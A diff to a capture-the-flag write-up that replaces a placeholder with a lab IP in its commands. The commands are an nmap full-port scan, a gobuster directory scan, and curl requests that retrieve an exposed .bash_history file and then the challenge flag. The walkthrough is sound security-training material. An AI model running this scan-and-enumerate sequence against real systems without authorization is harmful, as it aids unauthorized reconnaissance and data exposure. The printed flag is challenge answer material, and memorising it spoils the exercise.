@@ -19,7 +19,7 @@
 To first gain knowledge on what services are running on the machine, a port scan is executed using nmap. With it, all 65535 possible TCP ports are scanned for an answer. If open, the tool will gain information on the running versions.
 
 ```bash
-$ nmap -sV -Pn $IP -p-
+$ nmap -sV -Pn 192.168.10.18 -p-
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 15:58 CEST
 Nmap scan report for 192.168.10.18
 Host is up (0.0025s latency).
@@ -55,7 +55,7 @@ Since the portscan showed two webservers, these are analysed. On port 66 there i
 After the initial look a gobuster scan is initiated, to gather information on known paths and files.
 
 ```bash
-$ gobuster dir -u http://$IP:66 -w /usr/share/wordlists/dirb/common.txt -k 
+$ gobuster dir -u http://192.168.10.18:66 -w /usr/share/wordlists/dirb/common.txt -k 
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -83,7 +83,7 @@ Gobuster found a file called `.bash_history`, which is a file that is normally s
 
 
 ```bash
-$ curl http://$IP:66/.bash_history
+$ curl http://192.168.10.18:66/.bash_history
 nano /etc/issue
 nano /etc/hosts
 nano /etc/hostname
@@ -110,7 +110,7 @@ shutdown -h now
 In the history file, a `flag.txt` is edited. So we try to request this file.
 
 ```bash
-$ curl http://$IP:66/flag.txt -k        
+$ curl http://192.168.10.18:66/flag.txt -k        
 cyberctfd{r5KYSTQmMve4KVIoaeaVQH4NUfD7caR6}
 ```
 
